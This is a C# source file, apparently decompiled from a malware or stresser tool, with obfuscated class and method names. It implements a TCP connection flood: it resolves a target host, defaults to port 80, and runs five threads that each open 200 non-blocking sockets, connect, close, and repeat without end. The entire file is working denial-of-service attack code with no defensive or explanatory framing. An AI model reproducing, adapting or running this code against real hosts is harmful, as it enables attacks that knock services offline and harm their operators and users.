using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ns4;

internal class Class23
{
	private class Class24
	{
		private IPEndPoint ipendPoint_0;

		private Socket[] socket_0;

		private int int_0;

		public Class24(IPEndPoint ipendPoint_1, int int_1)
		{
			ipendPoint_0 = ipendPoint_1;
			int_0 = int_1;
		}

		public void method_0(IAsyncResult iasyncResult_0)
		{
		}

		public void method_1()
		{
			while (true)
			{
				try
				{
					socket_0 = new Socket[int_0];
					for (int i = 0; i < int_0; i++)
					{
						socket_0[i] = new Socket(ipendPoint_0.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
						socket_0[i].Blocking = false;
						AsyncCallback callback = method_0;
						socket_0[i].BeginConnect(ipendPoint_0, callback, socket_0[i]);
					}
					Thread.Sleep(100);
					for (int i = 0; i < int_0; i++)
					{
						if (socket_0[i].Connected)
						{
							socket_0[i].Disconnect(reuseSocket: false);
						}
						socket_0[i].Close();
						socket_0[i] = null;
					}
					socket_0 = null;
				}
				catch
				{
					for (int i = 0; i < int_0; i++)
					{
						try
						{
							if (socket_0[i].Connected)
							{
								socket_0[i].Disconnect(reuseSocket: false);
							}
							socket_0[i].Close();
							socket_0[i] = null;
						}
						catch
						{
						}
					}
				}
			}
		}
	}

	private ThreadStart[] threadStart_0;

	private Thread[] thread_0;

	public string string_0;

	private IPEndPoint ipendPoint_0;

	public bool bool_0;

	public int int_0 = 80;

	public int int_1 = 200;

	private Class24[] class24_0;

	public int int_2 = 5;

	public void method_0()
	{
		try
		{
			IPAddress[] addressList = Dns.GetHostEntry(string_0).AddressList;
			ipendPoint_0 = new IPEndPoint(addressList[0], int_0);
		}
		catch
		{
			IPAddress address = IPAddress.Parse(string_0);
			ipendPoint_0 = new IPEndPoint(address, int_0);
		}
		thread_0 = new Thread[int_2];
		threadStart_0 = new ThreadStart[int_2];
		class24_0 = new Class24[int_2];
		for (int i = 0; i < int_2; i++)
		{
			class24_0[i] = new Class24(ipendPoint_0, int_1);
			threadStart_0[i] = class24_0[i].method_1;
			thread_0[i] = new Thread(threadStart_0[i]);
			thread_0[i].Start();
		}
		bool_0 = true;
	}

	public void method_1()
	{
		for (int i = 0; i < int_2; i++)
		{
			try
			{
				thread_0[i].Abort();
				thread_0[i] = null;
				threadStart_0[i] = null;
				class24_0[i] = null;
			}
			catch
			{
			}
		}
		bool_0 = false;
	}
}
